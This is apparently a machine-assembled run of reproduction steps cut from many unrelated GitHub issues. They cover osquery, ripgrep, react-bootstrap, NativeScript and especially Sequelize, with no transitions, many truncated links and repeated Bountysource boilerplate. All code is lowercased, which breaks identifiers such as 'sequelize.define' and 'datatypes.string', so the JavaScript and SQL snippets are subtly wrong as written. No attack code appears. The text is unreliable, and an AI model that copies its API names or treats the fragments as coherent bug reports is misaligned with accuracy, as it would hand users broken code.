for example, the following 1_1 query should never run, since the discovery \'past\' query will not return any rows `{"discovery":{"past":"select * from time where year=1902;"}, "queries":{"1_1":"select * from osquery_info;"}}`
![photo_2018-10-08_20-46-16]( just randomly run this three commands:
start-service osqueryd
stop-service osqueryd c:\\programdata\\osquery\\osqueryd\\osqueryd.exe
on dell/hp/lenovo machines with manufacturer bios wmi tables installed
install osquery 3.3.0
select * from wmi_bios_info; - returns nothing install osquery 3.2.6
select * from wmi_bios_info; - returns bios info
- find a newer mac laptop with t2 chip (system report > controller)
- do not enable encryption via filevault
osquery> select name, encrypted, encryption_status from disk_encryption;
+--------------+-----------+-------------------+
| name | encrypted | encryption_status |
+--------------+-----------+-------------------+
| /dev/disk0 | 0 | undefined |
| /dev/disk0s1 | 0 | undefined |
| /dev/disk0s2 | 0 | undefined |
| /dev/disk1 | 0 | undefined |
| /dev/disk1s1 | 1 | encrypted |
| /dev/disk1s2 | 0 | not encrypted |
| /dev/disk1s3 | 0 | not encrypted |
| /dev/disk1s4 | 1 | encrypted |
| /dev/disk2 | 0 | undefined |
| /dev/disk2s1 | 0 | undefined |
+--------------+-----------+-------------------+
``` - verify that fde is not enabled ```
$ fdesetup status
filevault is off.
create new vm with win1 , 1803 (july), enterprise edition.
specs: cpu: 1 process, 2 cores.
memory: 3gb ram
hdd: 60gb run the following command (just the shell, no daemon installed): ```
osqueryi.exe --json --logger_min_status 2 "select * from (`file` ) where (`path` like \'c:\\%%\') and (`filename` = \'gvim.exe\') ;"
no results returned,` echo %errorlevel%` in cmd returns `"-1073740791" ( )`
`osqueryi "select * from last"`
`echo "select hardware_model, hardware_vendor, hardware_version from system_info;" | osqueryi --json | jq`
select key_strength from certificate
configure osqueryd to post via the tls module to a remote system (custom or demo server)
cloned repo
make sysprep
`git clone` the osquery repository
run `make depsclean` to ensure you do not have any existing osquery dependencies installed
run `make deps`
list database contents with `ldb`.
set up `ripgrep_config_path` and a configuration file containing `-p` or `--pretty`
run `ripgrep` with `-p -z` or `--pretty -z` at the command line.
notice that it works as expected, as it should for use in scripts.
run `ripgrep` with `-p -z -p` at the command line
notice that it works in an `alias`-compatible way as it should.
run `ripgrep` with `-pz` at the command line.
get an error message.
file `test.txt` with contents:
``` ripgrep usage:
rg --pcre2 -u '(?s)def (\\w+);(?=.*use \\w+)' test.txt --count-matches
codesandbox, nor jsfiddle didn't work at the time i wrote this issue
heres an example markup: ```
function app() { return ( <div classname="app"> <overlaytrigger trigger="click" placement="bottom" overlay={<h1>111111</h1>} > <button>press me!</button> </overlaytrigger> </div> );
``` click on the button and watch your console.
example in [codesandbox](
codesandbox example:
(currently set to 1.0.0-beta.10
please upgrade the react-bootstrap version to see the role attribute disappear.)
see
or
- [x] this example is as simple as possible
- [ ] this example does not rely on any third party code
please see
[js fiddle](
- [x] this example is as simple as possible
- [x] this example does not rely on any third party code
i'm new to plunker, but perhaps this link works?
- [x] this example is as simple as possible
- [x] this example does not rely on any third party code
- [x] this example is as simple as possible
- [x] this example does not rely on any third party code
[
[nshttptimeout.zip](
we have large project where this can be demonstrated
for now we are using a version of core modules that is right before this changeset went in which is where the problem was introduced:
#diff-c254ad08e8de54e61bc7d63b02b743ff
[htmlviewissue.zip](
the e2e test app
[nsbuttonfontawesomeissueios.zip](
repo where this bug is reproduced
[listpickertest.zip](
i've created a demo project in my ns-debugging repository:
[playground](
[
[listviewtemplates.zip](
[nsstyleissue.zip](
[nstabstripissue.zip](
[playground](
this is an official playground sample from this nativescript blog post: [
[playground](
tns create my-master-detail-ts --template tns-template-master-detail-ts
cd my-master-details-ts
tns run android
[nsimageiconfontissue.zip](
to preserve the changes when closing the app.
just create a new project with `tns create --ng statusbar-testy`
go to the following link on an android device and click on the buttons
after navigating back to the first page, notice that the navigatedto and navigatedfrom events are not fired, and the button to navigate to the second page is now broken
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
visible in e2e/ui-tests-app -> tabs -> nested-bottom-navigation example <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
use \'nested-frame-navigation\' app -> "page w/tabs" <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
**workaround**
set up `bindnigcontext` to the parent container
<stacklayout row="1" colspan="2" bindingcontext="{{testobj}}" orientation="horizontal"> <textfield text="{{ thing1, thing1 }}" hint="enter text..." /> <textfield text="{{ thing2, thing2 }}" hint="enter text..." /> </stacklayout>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
[samplenestedmodlwithdialog.zip]( **additional text**
i don't know if i'm doing it right on how to call the 2nd modal, or maybe it's because the ios runtime is not updated to the latest
but i'll leave a sample project for you guys to see
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
[archive.zip]( <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
i've created a pretty simple playground to demonstrate the problem: only needed to add the css as described above and changed the layout in the home component
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
demo project [here]( ![screen shot 2019-05-14 at 10 47 10 am]( <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
use [this playground](
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
playground sample:
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
i modified the sidedrawer-template to create this sample app:
[nstabviewfontissue.zip]( <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
i could not recreate this issue with playground as i needed the platform-declarations in dev dependencies.
[tabviewtest.zip]( <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
[here]( is a nativescript playground project
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
following is a playground example to replicate this issue
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
this playground is just a starter app with a tabview
you can see this problem if you open the preview via the qr code
close the preview app (not background, actually close it)
start a phone call and then reopen the preview app.
[playground]( <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
here is the [sample playground](
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
[playground](
[test3.zip](
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
this works
this **won't** work <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
[keyboardissueandroid.zip]( <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
here is a [play project]( with all the code for reproduce the problem <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
playground project for reference: <bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
tap the label and see a log for each element
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
[masterdetailng.zip](
[nshttptimeout.zip](
<bountysource-plugin> ---
want to back this issue? **[post a bounty on it!]( we accept bounties via [bountysource](
</bountysource-plugin>
**here is the link to the sscce for this issue:** /pull/92
attempting to register an `afterconnect()` hook
const sequelize = require('sequelize'); const sequelize = new sequelize({ dialect: 'sqlite', storage: 'db.sqlite',
}); sequelize.afterconnect(async (connection, config) => { console.log('hook called'); // <<< never happens connection.query('pragma journal_mode=wal;');
}); sequelize.authenticate().then(/* model setup, etc
const sequelize = require('sequelize') const sequelize = new sequelize('postgres://postgres:password@localhost:5432/postgres')
const test = sequelize.define( 'test', { tableid: { type: sequelize.string, primarykey: true }, owner: { type: sequelize.string, primarykey: true }, type: sequelize.string, }, { defaultscope: { attributes: { exclude: ['type'] } } }
) ;(async () => { await sequelize.query('drop table if exists tests cascade') await test.sync() const [test] = await test.upsert({ tableid: 'aa', owner: 'bb', type: 'cc' }, { returning: true }) console.log(test.tojson())
running in postgres, if you using literal in attributes and want to order result by the same literal, generated query is incorrect
const postgresconfig = { url: 'postgres://postgres:postgres@localhost:5432/sequelize_issue_sample', options: { dialect: 'postgres', logging: console.log, minifyaliases: true, dialectoptions: { ssl: false } }
}; const sequelize = new sequelize( postgresconfig.url, postgresconfig.options
); const user = sequelize.define('user', { id: { type: sequelize.integer, primarykey: true, autoincrement: true }, notice_period: { type: sequelize.integer, allownull: false }, end_date: { type: sequelize.date }
}); async function main() { await user.sync(); const cancellationdateliteral = sequelize.literal(`end_date - interval '1 month' * coalesce(notice_period,0)`); await user.findall({ attributes: ['id', [cancellationdateliteral, 'cancellation_date']], order: [[sequelize.literal('cancellation_date')]] });
} main(); ```
create a field of any type: const user = sequelize.define('user', { // model attributes are defined here searchfilter: { type: datatypes.string, allownull: true }
sequelize.sync({ alter: true })
``` then change the field type to `virtual`: ```js
const user = sequelize.define(\'user\', { // model attributes are defined here searchfilter: { type: datatypes.virtual, get() { return "foo"; }, }
sequelize.sync({ alter: true })
**here is the link to the sscce for this issue:** /pull/87 unfortunately v6 isn't available yet in that project, and attempting to update failed, so i was only able to test v6 locally for sqlite and v5 for postgres under the sscce repo
here\'s the heart of it const foo = sequelize.define(\'foo\', { id: { type: datatypes.uuid, defaultvalue: datatypes.uuidv4, primarykey: true }, name: { type: datatypes.string, allownull: false, unique: true } }); await sequelize.sync(); // upsert the initial data, with a unique "name" const [f1] = await foo.upsert({ name: \'foo\' }, { returning: true }); expect(await foo.count()).to.equal(1); // upsert the same data as before, which should result in matching the "name" // and returning the original record & "id" const [f2] = await foo.upsert({ name: \'foo\' }, { returning: true }); expect(await foo.count()).to.equal(1); expect(f1.id).to.equal(f2.id);
we have called bulkcreate on a model object
the options object which is prepared as an argument to the function, if we check it after execution, it contains the reference to the model object
**here is the link to the sscce for this issue:** link-here ```
i am having an issue when i try to use eager loading (joined queries) via sequelize
here are the details: **productgroup model definition** ...
id: { type: datatypes.integer, autoincrement: true, primarykey: true, field: 'id'
name: { type: datatypes.string(400), allownull: false, field: 'name'
// association
productgroup.hasmany( productscreenshot, { as: 'screenshots', foreignkey: 'productgroupid' }
``` **productscreenshot model definition**
id: { type: datatypes.integer, autoincrement: true, primarykey: true, field: 'id'
productgroupid: { type: datatypes.integer, allownull: false, field: 'productgroupid'
// association
productscreenshot.belongsto( productgroup, { foreignkey: 'productgroupid' }
``` and below query throws `duplicate column name 'id'` error when i try to get productscreenshot rows belongs to the queried productgroup.
query = object.assign({}, { where: { id: { [sequelize.op.eq]: 1 } }, include: [ { as: 'screenshots', model: 'productscreenshot' } ]
}) // run the query
const gamegroup = await db.models.productgroup.findone({ ...query, tablehint: sequelize.tablehints.nolock
/pull/85 const sequelize = createsequelizeinstance({ logqueryparameters: true, benchmark: true, define: { timestamps: false }
}); const bar = sequelize.define('bar', { name: datatypes.text, fooid: datatypes.integer
}); const foo = sequelize.define('foo', { name: datatypes.text,
}, { defaultscope: { include: [{model: bar}], }
}); bar.belongsto(foo, { foreignkey: 'fooid',
}); foo.hasmany(bar, { foreignkey: { name: 'fooid', allownull: false, }, ondelete: 'cascade',
}); await sequelize.sync(); const foo = await foo.create({name: 'foo'}); const bar = await bar.create({name:'bar', fooid: foo.id}); const foofromfind = await foo.findbypk(foo.id);
assert.ok(foofromfind.bars)
assert.equal(foofromfind.bars[0].name, 'bar') // here i would expect the defaultscope to be used as well
await foo.reload(); assert.ok(foo.bars) // fails
assert.equal(foo.bars[0].name, 'bar')
const sequelize = createsequelizeinstance({ logqueryparameters: true, benchmark: true,
}); const foo = sequelize.define('foo', {name: datatypes.text}); await sequelize.sync(); const foo = await foo.create({name: 'foo'}); assert.equal(foo.createdat, foo.updatedat); await foo.update({name: 'foo2'})
assert.isabove(foo.updatedat, foo.createdat); const previousupdatedat = foo.updatedat;
const newupdatedat = new date()
foo.update({updatedat: newupdatedat}) // this fails as the "updatedat" field was not updated
assert.isabove(foo.updatedat, previousupdatedat);
i get an exception when querying data through the association table and combining fields.
for example, collections is the main table, collection_products is the associated table, and products is the associated word table.
the query statement is as follows: await model.collections.findone({ include: [ 'images', { model: model.collection_products, as: 'products', attributes: ['id', sequelize.sequelize.col('product.title')], include: { model: model.products, as: 'product' } } ], where: { handle: this.ctx.params.handle } })
// model define
// table id-> model primarykey
// table people_id-> model id const people = sequelize.define('people', { id: { type: datatypes.bigint, allownull: false, field: 'people_id', }, primarykey: { type: datatypes.integer, autoincrement: true, field: 'id', }, name: { type: datatypes.string, }
// use cont results = await people.bulkcreate([{name: 'join',id:1}]); console.log(results[0].id);
// undefined
console.log(results[0].primarykey);
const sequelize = require('sequelize');
const cls = require('cls-hooked');
const ns = cls.createnamespace('aabb'); const dbname = '';
const dbuser = '';
const dbpassword = '';
const dbhost = ''; sequelize.usecls(ns); const s = new sequelize( dbname, dbuser, dbpassword, { dialect: 'mysql', host: dbhost, benchmark: true, logging: (msg, duration, attrs) => { const match = msg.match(/select\\s(\\d+)/); if (match[1] !== string(ns.get('logger'))) { console.error('cls is losed
expected: ' + ns.get('logger') + '
actual: ' + match[1]); } } },
); const execquery = async (v = 0) => { ns.set('logger', v); const resp = await s.query(`select ${v}`); return resp;
}; for (let idx=0; idx<10; idx++) { ((v) => { ns.runpromise(() => { return promise.all([ execquery(v), ]) }); })(idx);
i have the following function that constructs a `sequelize` query function constructquery(attributes, groupby) { return model.findall({ attributes: attributes, group: groupby })
when the value of the `groupby` argument is `[]`, `sequelize` generates a wrong sql query, leading to `unhandled rejection sequelizedatabaseerror: sqlite_error: near ";": syntax error`
background: - we have an existing sql database with data.
- i used sequelize-auto to generate definitions
- most of the tables we have contain "$" dollar sign so i am trying to use sequelize to insert some data to the table
let contract_name = { version: 1, id: 50, position: 50, value: "somename",
}; db.ri_contracts_names$dim.create(contract_name).then(() => { console.log("saved: " + contract_name.value);
}); db.ri_contracts_names$dim.findall({ limit: 20 }).then((rows) => { console.log(json.stringify(rows));
const sequelize = new sequelize(dburi, { logging: msg => console.log("global", msg),
sequelize.sync({ alter: true, logging: msg => console.log("sync", msg),
i am trying to use a built-in db function within a default constraint
(mysql inno-db) const foo = sequelize.define("foo", { uuid: { type: "binary(16)", defaultvalue: sequelize.fn("uuid_to_bin", sequelize.fn("uuid")), primarykey: true }
}, { timestamps: false //to simpify the query generated
i have a simple model named `foo`
module.exports = function(sequelize, datatypes) { return sequelize.define(\'foo\', { id: { type: "serial", allownull: false, primarykey: true }, count: { type: datatypes.double, allownull: false } }, { tablename: \'foo\' });
``` i perform the following query that counts the number of records
foo = sequelize.import('foo.js')
foo.count({ attributes: [ "id", "count" ]
```
const testtable = sequelize.define("testtable",{ actualid: { type: sequelize.datatypes.bigint, autoincrement: true, primarykey: true }, id: { type: sequelize.datatypes.uuid, unique: true, defaultvalue: sequelize.datatypes.uuidv4 }
}); testtable.create({},{}) .then(data => { // data.actualid is the same as data.id which is wrong!!! console.log(data); }) .catch(err => { console.log(err); })
a simplified reproduction documented below: ```javascript
//'./schemas/maintable.js' var modelname = 'maintable';
var tablename = 'main_table'; function model (sequelize, datatypes)
{ const model = sequelize.define(modelname,{ counter: { type: datatypes.bigint, autoincrement: true, primarykey: true }, id: { type: datatypes.uuid, unique: true, defaultvalue: datatypes.uuidv4 }, documentnumber: { type: datatypes.string, unique: true, allownull: true } }, { paranoid: true, underscored: false, tablename: tablename }); return model;
} module.exports = model;
``` ```javascript
//'./schemas/associatedtable.js' var modelname = 'associatedtable';
var tablename = 'associated_table'; function model (sequelize, datatypes)
{ const model = sequelize.define(modelname,{ sometext: { type: datatypes.string, allownull: true } }, { paranoid: true, underscored: false, tablename: tablename }); return model;
} module.exports = model;
```javascript
const sequelize = require('sequelize');
const sequelize = new sequelize( 'dbname', 'dbuser', 'dbpassword', { host: 'localhost', port: 1433, dialect: 'mssql', define: { underscored: true } }
); const db = {}; db.sequelize = sequelize;
db.sequelize = sequelize; db.maintable = require('./schemas/maintable')(sequelize, sequelize.datatypes);
db.associatedtable = require('./schemas/associatedtable')(sequelize, sequelize.datatypes); db.maintable.hasone(db.associatedtable, {as: 'associatedtable'}); ```
```javascript
var db = require('./db);
var uuid4 = require('uuid/v4');
var newrecord = { id: uuid4() associatedtable: { sometext: 'testing' }
}; db.sequelize.transaction({isolationlevel: db.sequelize.transaction.isolation_levels.repeatable_read}) .then(function (tran) { db.maintable.create(newrecord, { include: ['associatedtable'], transaction: tran }) .then(data => { console.log(data); }) .catch(err => { tran.rollback(); console.log(err); });
i am trying to use bulkcreate with include that has updateonduplicate option.
await product.bulkcreate(products, { updateonduplicate: ['name', 'description', 'subscriptionid', 'creditid'], include: [{ model: subscription, as: 'subscription', updateonduplicate: ['subscriptionfee', 'subscriptionreoccurrence'], }], });
my input is as following:
``` const products = [ { id: 70, subscription: { id: 59, subscriptionfee: 10, }, name: 'new plan name', description: '10% off', }, ];
i have a simple model named `listing` as follows module.exports = function(sequelize, datatypes) { return sequelize.define(\'listing\', { id: { type: "serial", allownull: false, primarykey: true }, foo: { type: datatypes.string(20), allownull: false } }, { tablename: \'listing\' });
``` i perform the following query that filters records by `foo`, i.e., the attribute `foo` of the resulting records should contain the substring `"bar"`
const {op, sequelize} = require('sequelize');
const sequelize = new sequelize('sqlite3_db_file' ,'user', 'password', { dialect: 'sqlite', storage: 'sqlite3_db_file', logging: true, define: { timestamps: false }
}); listing = sequelize.import('listing.js')
ret1 = listing.findall({ attributes: [ "id" ], where: { foo: { [op.substring]: sequelize.literal(\'bar\') } }
```
let's imagine we have 3 models: `company`, `subsidiary` and `image` with `underscored: true`
`image` has two fields: imageabletype: { type: datatypes.string, field: 'imageable_type'
imageableid: { type: datatypes.integer, field: 'imageable_id'
``` `company` model hasone `image` and default scope:
this.image = this.hasone(image, { foreignkey: 'imageableid', as: 'image', scope: { imageabletype: 'company' }
}); this.addscope('defaultscope', { include: [{association: this.image}]
}, { override: true });
``` and in `subsidiary` model:
this.company = this.belongsto(company, {foreignkey: 'companyid', as: 'company'});
``` and we call
let count = await subsidiary.count({ include: [{ association: subsidiary.company, required: true }]
```
recently, i'm developing a new feature that getting the statics from the redis, and then updating the new data to the relational database by the fixed time
here is the smallest dialect; let data=[{ id:1, uv:this.literal(`uv+1`) }];
await this.bulkcreateandupdate(data,'article',['uv']); //packaged the bulkcreate function for use async bulkcreateandupdate(createarray,table,updatekeys=[],tran=null) { let res=0; let tab=string(table); let options={}; if(updatekeys.length) { options.updateonduplicate=updatekeys; } if(tran) { options.transaction=tran; } if(tab) { res = await this.ctx.model[tab].bulkcreate(createarray,options); } return res }
i'm reloading an instance with `options.where` and the [base]( #l4140) is completely lost, which causes the fetch of a entirely different instance
'use strict'; /* * copy this file to ./sscce.js * add code from issue * npm run sscce-{dialect} */ const sequelize = require('./index');
const sequelize = require('./test/support').createsequelizeinstance(); class mymodel extends sequelize.model { }
mymodel.init({ id: { primarykey: true, type: sequelize.datatypes.integer }, name: { type: sequelize.datatypes.string, }
}, { sequelize }); sequelize.sync().then(() => { return mymodel.update({ name: 'test' }, { where: { name: ['$test'] } });
sequelize.define('foo', { enums: datatypes.array(datatypes.enum('one', 'two', 'three'))
sequelize.sync({ alter : true })
running in postgres, if you have through tables with long names, they don't get minified alongside others
const {sequelize} = require('sequelize'); const sequelize = new sequelize('test', 'postgres', 'bmslsa-pwd', { host: 'localhost', dialect: 'postgres', minifyaliases: true
}); const user = sequelize.define('user', {});
const address = sequelize.define('address', {}); user.belongstomany(address, { through: 'useraddresswithextranamepaddinghelloworldwithextranamepadding'
}); user.findall({ include: { model: address, }
**here is the link to the sscce for this issue:** /pull/57
const value = 43069.0122916667;
getsqltypefromjstype(value, connection.lib.types);
using `count()` and `distinct: true` option
not directly but through [feathers-sequalize]( #l131)
**here is the link to the sscce for this issue:** /pull/43
i am trying to have the same format in a 'create' as in a 'findall' call
const user = sequelizeclient.define(\'user\', { text: { type: datatypes.string, allownull: false }, test: { type: datatypes.boolean, defaultvalue: false }, somethingthatsnull: { type: datatypes.string, allownull: true } }, { hooks: { beforecount(options) { options.raw = true; } } }); let createduser = await user.create({ text: "testsequelize"},{raw: true}); console.log("--------------created sequelize user",createduser.datavalues);
--------------created sequelize user { test: false, id: 29, text: 'testsequelize', updatedat: 2020-01-29t22:38:18.707z, createdat: 2020-01-29t22:38:18.707z }
*/ let gottenusers = await user.findall({where:{id:createduser.id},raw:true}); console.log("-------------gotten sequelize user",gottenusers);
-------------gotten sequelize user [ { id: 29, text: 'testsequelize', test: 0, somethingthatsnull: null, createdat: 2020-01-29t22:38:18.000z, updatedat: 2020-01-29t22:38:18.000z } ]
i have two models ( `exercise` and `exercise_metrics` ) which simplied definition could be : module.exports = (sequelize, datatypes) => { let exercise = sequelize.define(\'exercise\', { title: { type: datatypes.string, allownull: false, }, description: { type: datatypes.text, defaultvalue: "" }, file: { type: datatypes.string, allownull: true }, state: { type: datatypes.enum("draft", "pending", "validated", "not_validated"), allownull: false, defaultvalue: "draft" }, url: { type: datatypes.string, allownull: true } }, { // #configuration // enable optimistic locking
when enabled, sequelize will add a version count attribute // to the model and throw an optimisticlockingerror error when stale instances are saved
// set to true or a string with the attribute name you want to use to enable
version: true, // scopes : reuse more easily some common parts // scopes: { // include the metrics part with_exercise_metrics() { return { include: [ // load exercise evaluation { model: sequelize.models.exercise_metrics, as: "metrics", required: true, attributes: [ ["vote_count", "votes"], ["avg_vote_score", "avg_score"] ] } ] } }, } }); exercise.associate = function (models) { // an exercise has one metrics exercise.hasone(models.exercise_metrics, { as: "metrics", foreignkey: { name: "exercise_id", allownull: false } }); }; return exercise;
// this sub table is useful to save computation times for search
module.exports = (sequelize, datatypes) => { let exercise_metrics = sequelize.define(\'exercise_metrics\', { // to count how many votes for this exercise vote_count: { type: datatypes.integer, defaultvalue: 0, allownull: false }, // the average score avg_vote_score: { type: datatypes.decimal(3,2), defaultvalue: 0.0, allownull: false }, // the tags ids, pre-retrieved so that search is faster tags_ids: { type: datatypes.array(datatypes.integer), allownull: false, defaultvalue: [] } }, { // #configuration timestamps: false, tablename: "exercises_metrics" }); exercise_metrics.associate = function (models) { // each exercise has only one exercise metrics models.exercise_metrics.belongsto(models.exercise, { as: "exercise", foreignkey: { name: "exercise_id", allownull: false } }) }; return exercise_metrics;
``` when using `with_exercise_metrics` scope, i got this bug.
let's say we have three tables: `users`, `tasks` and `participation`
there's a n:m relation between `users` and `tasks`, which is based on the through table `participations`
the through table has many columns
in some scenarios, only one of them is needed
so i write some query like this: ```
user.findall({ include: [task.associations.tasks], through: { attributes: ['role'] }
``` but the query result still contains all columns
i also found this issue:
but `includeignoreattributes` seems doesn't work at all
**here is the link to the sscce for this issue:** /pull/33
> user model:
``` module.exports = (sequelize, datatypes) => { const user = sequelize.define("user", { id: { type: datatypes.integer, autoincrement: true }, uid: { type: datatypes.string(20), unique: true, primarykey: true, unique: { args: true, msg: "uid already exists" }, field: "uid" },
roles: { type: datatypes.array(datatypes.string), field: "roles", validate: { validaterole(value) { if (!array.isarray(value) || (array.isarray(value) && value.length == 0)) { throw new error(\'role / type is required.\'); } } }, get: function () { var obj = []; if (this.getdatavalue("rolelist") == null) { obj = []; } else { obj = this.getdatavalue("rolelist"); } return obj; }, set: function (value) { let roleuids = _.pluck(value, "uid"); this.setdatavalue("roles", roleuids); } }, token: { type: datatypes.string, field: "token" }, }, { tablename: "users", timestamps: true, paranoid: true } ); user.associate = function (models) {
user.hasone(models.schoolstudents, { as: "schoolstudent", foreignkey: "user_uid", sourcekey: "uid" });
``` > schoolstudent model:
module.exports = (sequelize, datatypes) => { const schoolstudents = sequelize.define( "schoolstudents", { id: { type: datatypes.integer, autoincrement: true }, userid: { type: datatypes.string(50), primarykey: true, field: "user_uid" },specialties: { type: datatypes.array(datatypes.string), field: "specialties", get: function () { var obj = []; if (this.getdatavalue("specialtylist") == null) { obj = []; } else { obj = this.getdatavalue("specialtylist"); } return obj; }, set: function (value) { let specialties = []; if (value) { specialties = _.pluck(value, "uid"); } this.setdatavalue("specialties", specialties); } }}, { freezetablename: true, paranoid: true, tablename: "school_students", timestamps: true } ); schoolstudents.associate = function (models) { schoolstudents.belongsto(models.user, { foreignkey: "user_uid", targetkey: "uid" }); schoolstudents.hasmany(models.studentspecialties, { as: "specialtylist", foreignkey: "stud_user_uid", sourcekey: "user_uid" }); }; ```
i have a model that contained precomputed fields including a column that is an array of int (`tags_ids`)
here is its definition : 'use strict'; // this sub table is useful to save computation times for search
module.exports = (sequelize, datatypes) => { let exercise_metrics = sequelize.define(\'exercise_metrics\', { // to count how many votes for this exercise vote_count: { type: datatypes.integer, defaultvalue: 0, allownull: false }, // the average score avg_vote_score: { type: datatypes.decimal(3,2), defaultvalue: 0.0, allownull: false }, // the tags ids, pre-retrieved so that search is faster tags_ids: { type: datatypes.array(datatypes.integer), allownull: false, defaultvalue: [] } }, { // #configuration timestamps: false, tablename: "exercises_metrics" }); exercise_metrics.associate = function (models) { // each exercise has only one exercise metrics models.exercise_metrics.belongsto(models.exercise, { as: "exercise", foreignkey: { name: "exercise_id", allownull: false } }) }; return exercise_metrics;
``` with some situations, it may be necessary to update this column to an empty array.
so i tried this kind of query : ```js
some_instance.update({tags_ids: []})
i'm using sqlite3 with multiple `:memory:` databases (part of my unittests, each test starts with a clean database)
i try to save a `belongstomany` association but it only updates the database for the first connection
**here is the link to the sscce for this issue:**
log for the sqlite3 test:
the relevant piece of my `config.json`:
{ "development": { "username": null, "password": null, "database": "experiment", "host": "127.0.0.1", "dialect": "postgres" }
``` after initializing the project, i ran `npx sequelize-cli models:generate --name foo --attributes foo:string,bar:string,quux:integer` and edited the `migrations/...-create-foo.js` file as such: ```js
module.exports = { up: (queryinterface, sequelize) => { return queryinterface.createtable('foos', { foo: { allownull: false, autoincrement: false, primarykey: true, type: sequelize.string }, bar: { type: sequelize.string }, quux: { type: sequelize.integer }, createdat: { allownull: false, type: sequelize.date }, updatedat: { allownull: false, type: sequelize.date } }); }, down: (queryinterface, sequelize) => { return queryinterface.droptable('foos'); }
``` small test script:
const db = require(\'./models/index.js\'); const foo = db.foo; foo.create({ foo: "foo", bar: "bar", quux: 42 }).then(() => console.log("it worked!"));
// pseudo representation of the issue
const pick = require('lodash/pick'); class user extends model { static fields(datatypes) { return { email: { type: datatypes.string, allownull: false, validate: { isemail: true, notempty: true }, unique: { msg: 'this email address is already in use.' } }, firstname: { type: datatypes.string, field: 'first_name' }, lastname: { type: datatypes.string, field: 'last_name' }, createdat: { type: datatypes.date, field: 'created_at' }, updatedat: { type: datatypes.date, field: 'updated_at' }, deletedat: { type: datatypes.date, field: 'deleted_at' }, profile: { type: new datatypes.virtual(datatypes.abstract, ['id', 'firstname', 'lastname', 'email']), get() { return pick(this, ['id', 'firstname', 'lastname', 'email']); } } }; }
somehere in controller const getpost = (req, params, next) => { const include = { model: user, as: 'author', attributes: ['profile'] }; return post.findbypk(req.params.id, { include }) .then(post => res.json({ post }));
to test creating db schemas, i called sync()
and, i got the message "unhandled rejection typeerror: converting circular structure to json" regardless \'force\' is \'true\' or \'false\' * db connection and model definitions const sequelize = require(\'sequelize\');
const sequelize = new sequelize(process.env.db_name, process.env.db_user, process.env.db_pass,{ host: process.env.db_host, dialect: 'mariadb', // i just tried to put 'mysql' with mariadb, and it showed same output with warning messages
dialectoptions: { collate: 'utf8mb4_general_ci', useutc: false, timezone: 'etc/gmt0' }
}) module.exports = { sequelize: sequelize, user: sequelize.define('user', { name: sequelize.string })
``` * the code calling sync()
sequelize.sync({force: false }) .then(done) .catch((err) => { throw err })
**here is [the link to the sscce for this issue](/pull/26):**
i have two tables - channel and track
one channel can have multiple tracks, one track belongs to one channel
when trying to select a channel with its tracks like this: const channel = await channel.findone({ where: { token: 'channel-token' }, include: [{ model: track, as: 'tracks' }]
``` the query fails with the error: `the column 'id' was specified multiple times for 'channel'.` this error started from the version 5.18.4, earlier versions are not affected
this is the full, minimal code to reproduce the issue (except the config and the database): ```js
const settings = require('./lib/settings');
const sequelize = require('sequelize');
